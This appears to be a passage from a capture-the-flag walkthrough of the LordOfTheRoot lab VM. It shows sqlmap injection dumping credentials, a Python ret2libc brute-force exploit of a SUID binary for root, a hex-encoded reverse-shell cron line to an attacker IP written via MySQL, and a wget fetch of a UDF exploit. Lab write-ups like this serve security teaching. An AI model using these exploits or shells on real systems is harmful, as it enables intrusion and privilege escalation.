|      &lt;  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  &lt;_&gt; )  \___|    &lt;   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  &lt;_&gt; )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  &gt;__|_ \  \___  /   |__|  |__|\___  &gt;___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  &gt;__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
root@192.168.179.161'</span>s password: 
</code></pre></div></div>

<p>With a oneliner bash script I connected to ports 1,2,3 sequentially.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="k">for </span>x <span class="k">in </span>1 2 3<span class="p">;</span> <span class="k">do </span>nc <span class="nt">-w</span> 1 192.168.179.161 <span class="nv">$x</span><span class="p">;</span> <span class="k">done</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.161] 1 <span class="o">(</span>tcpmux<span class="o">)</span> : Connection timed out
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.161] 2 <span class="o">(</span>?<span class="o">)</span> : Connection timed out
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.161] 3 <span class="o">(</span>?<span class="o">)</span> : Connection timed out
</code></pre></div></div>

<p>The target machine was rescanned to detect possible open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p</span> 1-65535 192.168.179.161 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p</span> 1-65535 192.168.179.161 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
adding 192.168.179.161/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `1-65535'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
TCP open 192.168.179.161:1337  ttl 64
TCP open 192.168.179.161:22  ttl 64
sender statistics 2826.7 pps with 196605 packets sent total
listener statistics 12 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.161  ttl 64 
TCP open          menandmice-dns[ 1337]         from 192.168.179.161  ttl 64
</code></pre></div></div>

<p>With nmap service detection and script scanning was performed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p22</span>,1337 192.168.179.161 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd <span class="o">(</span>DSA<span class="o">)</span>
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 <span class="o">(</span>RSA<span class="o">)</span>
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 <span class="o">(</span>ED25519<span class="o">)</span>
1337/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>The web service running on port 1337 doesn’t contain anything, to more than one image.</p>

<p><img src="/assets/images/lordoftheroot/screenshot-1.png" alt="" /></p>

<p>Checking the robots.txt file, a base64 string is commented in the page source.</p>

<p><img src="/assets/images/lordoftheroot/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/lordoftheroot/screenshot-3.png" alt="" /></p>

<p>I decoded the base64 string 2 times and got a new web path.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.161:1337/robots.txt | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'TH[^&gt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">base64</span> <span class="nt">-d</span> 2&gt;/dev/null 
/978345210/index.php
</code></pre></div></div>

<p>I accessed it, and it redirected me to a login page.</p>

<p><img src="/assets/images/lordoftheroot/screenshot-4.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="sql-injection">SQL Injection</h3>

<p>To further test the login form I used sqlmap, this detected a SQL Injection vulnerability in the username parameter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5
...
POST parameter <span class="s1">'username'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 4856 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: username <span class="o">(</span>POST<span class="o">)</span>
    Type: time-based blind
    Title: MySQL <span class="o">&gt;=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
    Payload: <span class="nv">username</span><span class="o">=</span>admin<span class="s1">' AND (SELECT 8370 FROM (SELECT(SLEEP(5)))txxC)-- bzWz&amp;password=password&amp;submit= Login
---
[21:42:20] [INFO] the back-end DBMS is MySQL
...
</span></code></pre></div></div>

<p>Listing the available databases.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--dbs</span>
...
available databases <span class="o">[</span>4]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> mysql
<span class="o">[</span><span class="k">*</span><span class="o">]</span> performance_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Webapp
</code></pre></div></div>

<p>Retrieving the users table from the Webapp database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> Webapp <span class="nt">--tables</span>
...
Users
Database: Webapp
<span class="o">[</span>1 table]
+-------+
| Users |
+-------+
</code></pre></div></div>

<p>Listing the columns from the table users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> Webapp <span class="nt">-T</span> Users <span class="nt">--columns</span>
...
Database: Webapp
Table: Users
<span class="o">[</span>3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| <span class="nb">id</span>       | int<span class="o">(</span>10<span class="o">)</span>      |
| password | varchar<span class="o">(</span>255<span class="o">)</span> |
| username | varchar<span class="o">(</span>255<span class="o">)</span> |
+----------+--------------+
</code></pre></div></div>

<p>Retrieving the user credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>sqlmap <span class="nt">-u</span> http://192.168.179.161:1337/978345210/index.php <span class="nt">--data</span> <span class="s2">"username=admin&amp;password=password&amp;submit=+Login+"</span> <span class="nt">--risk</span> 3 <span class="nt">--level</span> 5 <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">-D</span> Webapp <span class="nt">-T</span> Users <span class="nt">-C</span> <span class="nb">id</span>,username,password <span class="nt">--dump</span>
...
Database: Webapp
Table: Users
<span class="o">[</span>5 entries]
+----+----------+------------------+
| <span class="nb">id</span> | username | password         |
+----+----------+------------------+
| 1  | frodo    | iwilltakethering |
| 2  | smeagol  | MyPreciousR00t   |
| 3  | aragorn  | AndMySword       |
| 4  | legolas  | AndMyBow         |
| 5  | gimli    | AndMyAxe         |
+----+----------+------------------+
</code></pre></div></div>

<h3 id="access-via-ssh">Access via SSH</h3>

<p>The credentials are in plain text, so we don’t need to crack them, with the user smeagol, I was able to access via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@192.168.179.161<span class="s1">'s password: 
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)

 * Documentation:  https://help.ubuntu.com/

                            .____    _____________________________                              
                            |    |   \_____  \__    ___/\______   \                             
                            |    |    /   |   \|    |    |       _/                             
                            |    |___/    |    \    |    |    |   \                             
                            |_______ \_______  /____|    |____|_  /                             
                                    \/       \/                 \/                              
 __      __       .__                                ___________      .__                   .___
/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
 \        /\  ___/|  |_\  \__(  &lt;_&gt; )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
  \__/\  /  \___  &gt;____/\___  &gt;____/|__|_|  /\___  &gt;  \___  /   |__|  |__|\___  &gt;___|  /\____ | 
       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135
smeagol@LordOfTheRoot:~$ id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
</span></code></pre></div></div>

<p>Listing the SUID binary files, three of them catch my attention.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null 
...
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
...
</code></pre></div></div>

<h3 id="suid-binary">SUID Binary</h3>

<p>So I tried to cause a crash passing it 500 characters as parameter.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="k">for </span>x <span class="k">in</span> <span class="o">{</span>1..3<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$x</span><span class="p">;</span> /SECRET/door<span class="nv">$x</span>/file <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*500)'</span><span class="si">)</span><span class="p">;</span> <span class="k">done
</span>1
2
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
3
</code></pre></div></div>

<p>The crash was triggered on the file of the door2, since this vulnerable binary randomly switches doors in a certain period of time, I decided to make a copy of this to another directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /SECRET/door<span class="k">*</span> | <span class="nb">grep </span>file
<span class="nt">-rwsr-xr-x</span> 1 root root 7370 Sep 17  2015 file
<span class="nt">-rwsr-xr-x</span> 1 root root 5150 Sep 22  2015 file
<span class="nt">-rwsr-xr-x</span> 1 root root 7370 Sep 17  2015 file

smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">cp</span> /SECRET/door2/file <span class="nb">.</span>
</code></pre></div></div>

<p>Before to start debugging, I was able to detect that the ASLR protection is enabled, since we can see that only two values of the memory address are changing, we can brute force to bypass this.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space
2
smeagol@LordOfTheRoot:~<span class="nv">$ </span>ldd file | <span class="nb">grep</span> <span class="s1">'libc'</span>
        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7546000<span class="o">)</span>
smeagol@LordOfTheRoot:~<span class="nv">$ </span>ldd file | <span class="nb">grep</span> <span class="s1">'libc'</span>
        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7521000<span class="o">)</span>
smeagol@LordOfTheRoot:~<span class="nv">$ </span>ldd file | <span class="nb">grep</span> <span class="s1">'libc'</span>
        libc.so.6 <span class="o">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb752e000<span class="o">)</span>
</code></pre></div></div>

<p>Exists a technique named ret2lib, this does not require of a shellcode to exploit it, we need to find the memory address of <strong>system, exit and shell</strong>, as shown below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>readelf <span class="nt">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="nt">-w</span> <span class="s1">'system'</span>
  1443: 00040190    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
  
smeagol@LordOfTheRoot:~<span class="nv">$ </span>readelf <span class="nt">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="nt">-w</span> <span class="s1">'exit'</span>
   139: 000331e0    45 FUNC    GLOBAL DEFAULT   12 <span class="nb">exit</span>@@GLIBC_2.0
  
smeagol@LordOfTheRoot:~<span class="nv">$ </span>strings <span class="nt">-atx</span> /lib/i386-linux-gnu/libc.so.6 | <span class="nb">grep</span> <span class="s1">'/bin/sh'</span>
 160a24 /bin/sh
</code></pre></div></div>

<p>The following python script helped me to brute force and exploit the vulnerable binary automatically, an interesting article that talks about this topic you can find it <a href="https://akshit-singhal.medium.com/how-to-bypass-aslr-to-perform-buffer-overflow-attacks-2d5f6707399c">here</a>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="p">,</span><span class="n">os</span>

<span class="n">libc_address</span><span class="o">=</span><span class="mh">0xb7578000</span>

<span class="n">system</span><span class="o">=</span><span class="mh">0x00040190</span>
<span class="nb">exit</span><span class="o">=</span><span class="mh">0x000331e0</span>
<span class="n">shell</span><span class="o">=</span><span class="mh">0x00160a24</span>

<span class="n">system_addr</span><span class="o">=</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">system</span><span class="p">)</span>
<span class="n">exit_addr</span><span class="o">=</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="nb">exit</span><span class="p">)</span>
<span class="n">shell_addr</span><span class="o">=</span><span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">libc_address</span> <span class="o">+</span> <span class="n">shell</span><span class="p">)</span>

<span class="n">buf</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">171</span>
<span class="n">buf</span><span class="o">+=</span><span class="n">system_addr</span>
<span class="n">buf</span><span class="o">+=</span><span class="n">exit_addr</span>
<span class="n">buf</span><span class="o">+=</span><span class="n">shell_addr</span>

<span class="n">i</span><span class="p">,</span><span class="n">n</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span>

<span class="k">while</span><span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">):</span>
    <span class="n">x</span><span class="o">=</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">getsize</span><span class="p">(</span><span class="s">"/SECRET/door{}/file"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">5150</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Door {} Open"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
        <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">" Attempt {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="n">path</span><span class="o">=</span><span class="s">"/SECRET/door{}/file"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
            <span class="n">ret</span><span class="o">=</span> <span class="n">call</span><span class="p">([</span><span class="n">path</span><span class="p">,</span> <span class="n">buf</span><span class="p">])</span>
            <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
    <span class="n">n</span><span class="o">+=</span><span class="mi">1</span>
    <span class="n">i</span><span class="o">=</span><span class="mi">1</span>

    <span class="k">if</span> <span class="n">n</span><span class="o">==</span><span class="mi">4</span><span class="p">:</span>
        <span class="n">n</span><span class="o">=</span><span class="mi">1</span>
</code></pre></div></div>

<p>As we see, with few attempts was possible to exploit the binary and get a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>python exp.py
<span class="o">[</span>-] Door 1 Open   
 ...
 Attempt 70
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
<span class="c"># python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'</span>
root@LordOfTheRoot:/dev/shm# <span class="nb">cd</span> /root/
root@LordOfTheRoot:/root# <span class="nb">ls
</span>buf  buf.c  Flag.txt  other  other.c  switcher.py
</code></pre></div></div>

<p>In the root directory the switcher.py script randomly copy the buf file through a cron job that runs every three minutes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@LordOfTheRoot:/root# <span class="nb">cat </span>switcher.py 
<span class="c">#!/usr/bin/python</span>
import os
from random import randint

<span class="nv">targets</span><span class="o">=</span> <span class="o">[</span><span class="s2">"/SECRET/door1/"</span>,<span class="s2">"/SECRET/door2/"</span>,<span class="s2">"/SECRET/door3/"</span><span class="o">]</span>
<span class="k">for </span>t <span class="k">in </span>targets:
   os.system<span class="o">(</span><span class="s2">"rm "</span>+t+<span class="s2">"*"</span><span class="o">)</span>
   os.system<span class="o">(</span><span class="s2">"cp -p other "</span>+t<span class="o">)</span>
   os.system<span class="o">(</span><span class="s2">"cp -p "</span>+t+<span class="s2">"other "</span>+t+<span class="s2">"file"</span><span class="o">)</span>
   os.system<span class="o">(</span><span class="s2">"rm "</span>+t+<span class="s2">"other"</span><span class="o">)</span>

luckyDoor <span class="o">=</span> randint<span class="o">(</span>0,2<span class="o">)</span>
<span class="nv">t</span><span class="o">=</span>targets[luckyDoor]
os.system<span class="o">(</span><span class="s2">"rm "</span>+t+<span class="s2">"*"</span><span class="o">)</span>
os.system<span class="o">(</span><span class="s2">"cp -p buf "</span>+t<span class="o">)</span>
os.system<span class="o">(</span><span class="s2">"cp -p "</span>+t+<span class="s2">"buf "</span>+t+<span class="s2">"file"</span><span class="o">)</span>
os.system<span class="o">(</span><span class="s2">"rm "</span>+t+<span class="s2">"buf"</span><span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@LordOfTheRoot:/root# crontab <span class="nt">-l</span>
<span class="c"># Edit this file to introduce tasks to be run by cron.</span>
<span class="c"># </span>
<span class="c"># Each task to run has to be defined through a single line</span>
<span class="c"># indicating with different fields when the task will be run</span>
<span class="c"># and what command to run for the task</span>
<span class="c"># </span>
<span class="c"># To define the time you can provide concrete values for</span>
<span class="c"># minute (m), hour (h), day of month (dom), month (mon),</span>
<span class="c"># and day of week (dow) or use '*' in these fields (for 'any').# </span>
<span class="c"># Notice that tasks will be started based on the cron's system</span>
<span class="c"># daemon's notion of time and timezones.</span>
<span class="c"># </span>
<span class="c"># Output of the crontab jobs (including errors) is sent through</span>
<span class="c"># email to the user the crontab file belongs to (unless redirected).</span>
<span class="c"># </span>
<span class="c"># For example, you can run a backup of all your user accounts</span>
<span class="c"># at 5 a.m every week with:</span>
<span class="c"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
<span class="c"># </span>
<span class="c"># For more information see the manual pages of crontab(5) and cron(8)</span>
<span class="c"># </span>
<span class="c"># m h  dom mon dow   command</span>
<span class="k">*</span>/3 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> /root/switcher.py
</code></pre></div></div>

<p>This is the vulnerable buf.c script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@LordOfTheRoot:/root# <span class="nb">cat </span>buf.c 
<span class="c">#include &lt;string.h&gt;</span>
<span class="c">#include &lt;stdio.h&gt;</span>
<span class="c">#include &lt;stdlib.h&gt;</span>

int main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">){</span>

        char buff[159]<span class="p">;</span>
        <span class="k">if</span><span class="o">(</span>argc &lt;2<span class="o">){</span>
                <span class="nb">printf</span><span class="o">(</span><span class="s2">"Syntax: %s &lt;input string&gt;</span><span class="se">\n</span><span class="s2">"</span>, argv[0]<span class="o">)</span><span class="p">;</span>
                <span class="nb">exit</span> <span class="o">(</span>0<span class="o">)</span><span class="p">;</span>

        <span class="o">}</span>
  strcpy<span class="o">(</span>buff, argv[1]<span class="o">)</span><span class="p">;</span>
  <span class="k">return </span>0<span class="p">;</span>

<span class="o">}</span>
</code></pre></div></div>

<p>This is the non-vulnerable other.c script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@LordOfTheRoot:/root# <span class="nb">cat </span>other.c 
<span class="c">#include &lt;string.h&gt;</span>
<span class="c">#include &lt;stdio.h&gt;</span>
<span class="c">#include &lt;stdlib.h&gt;</span>

int main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">){</span>

        char buff[150]<span class="p">;</span>
        <span class="k">if</span><span class="o">(</span>argc &lt;2<span class="o">){</span>
                <span class="nb">printf</span><span class="o">(</span><span class="s2">"Syntax: %s &lt;input string&gt;</span><span class="se">\n</span><span class="s2">"</span>, argv[0]<span class="o">)</span><span class="p">;</span>
                <span class="nb">exit</span> <span class="o">(</span>0<span class="o">)</span><span class="p">;</span>

        <span class="o">}</span>
  //This Program does nothing
  <span class="k">return </span>0<span class="p">;</span>

<span class="o">}</span> 
</code></pre></div></div>

<h3 id="mysql-running-with-root-permissions">MySQL running with root permissions</h3>

<p>Another path to get root is through MySQL, as it runs as root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:/<span class="nv">$ </span>ps aux | <span class="nb">grep </span>mysqld root      1360  0.6  0.1
318404   848 ?        Ssl  13:43   1:12 /usr/sbin/mysqld
</code></pre></div></div>

<p>The credentials to connect to MySQL are in the login.php file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:/var/www/978345210<span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'$db '</span> login.php 
                <span class="nv">$db</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s1">'localhost'</span>, <span class="s1">'root'</span>, <span class="s1">'darkshadow'</span>, <span class="s1">'Webapp'</span><span class="o">)</span><span class="p">;</span>
</code></pre></div></div>

<p>I encoded to hexadecimal a reverse shell that runs every minute.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LordOfTheRoot:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'* * * * * root /bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span> | xxd <span class="nt">-ps</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="p">;</span> <span class="nb">echo
</span>2a202a202a202a202a20726f6f74202f62696e2f62617368202d6320222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3137392e312f34343320303e2631220a
</code></pre></div></div>

<p>I wrote the reverse shell in the /etc/cron.d directory using mysql.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select </span>0x2a202a202a202a202a20726f6f74202f62696e2f62617368202d6320222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3137392e312f34343320303e2631220a into outfile <span class="s1">'/etc/cron.d/back.door'</span><span class="p">;</span>
Query OK, 1 row affected <span class="o">(</span>0.01 sec<span class="o">)</span>
</code></pre></div></div>

<p>As we can see our reverse shell was written as root, but it doesn’t is executed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/cron.d/back.door <span class="nt">-rw-rw-rw-</span> 1 root
root 80 Nov 03 06:06 /etc/cron.d/back.door 
</code></pre></div></div>

<h3 id="mysql-user-defined-functions">MySQL User Defined Functions</h3>

<p>This version of MySQL is affected by a vulnerability that allows users to run user-defined functions to execute commands in the context of MySQL, which in this case is root. access to MySQL as the root user is required.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>mysql <span class="nt">--version</span> 
mysql Ver 14.14 Distrib 5.5.44, <span class="k">for </span>debian-linux-gnu <span class="o">(</span>i686<span class="o">)</span> using readline 6.3 
</code></pre></div></div>

<p>As we know the MySQL credentials and this is running as root only we just to look for a UDF exploit, there is an article how to exploit UDF <a href="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit mysql udf <span class="nb">local</span>
<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
 Exploit Title                                                                      |  Path
<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
MySQL 4.0.17 <span class="o">(</span>Linux<span class="o">)</span> - User-Defined Function <span class="o">(</span>UDF<span class="o">)</span> Dynamic Library <span class="o">(</span>1<span class="o">)</span>              | linux/local/1181.c
MySQL 4.x/5.0 <span class="o">(</span>Linux<span class="o">)</span> - User-Defined Function <span class="o">(</span>UDF<span class="o">)</span> Dynamic Library <span class="o">(</span>2<span class="o">)</span>             | linux/local/1518.c
MySQL 4/5/6 - UDF <span class="k">for </span>Command Execution                                             | linux/local/7856.txt
<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
</code></pre></div></div>

<p>I copied the 1518.c exploit to my current directory, moved it to the web root, and started the apache service.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/1518.c
root@kali:~<span class="nv">$ </span><span class="nb">mv </span>1518.c /var/www/html
root@kali:~<span class="nv">$ </span>systemctl start apache2.service
</code></pre></div></div>

<p>On the target machine we download the UDF exploit, we compile it and create the shared library.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>wget 192.168.179.1/1518.c
smeagol@LordOfTheRoot:~<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-c</span> 1518.c <span class="nt">-o</span> raptor_udf2.o <span class="nt">-fPIC</span>
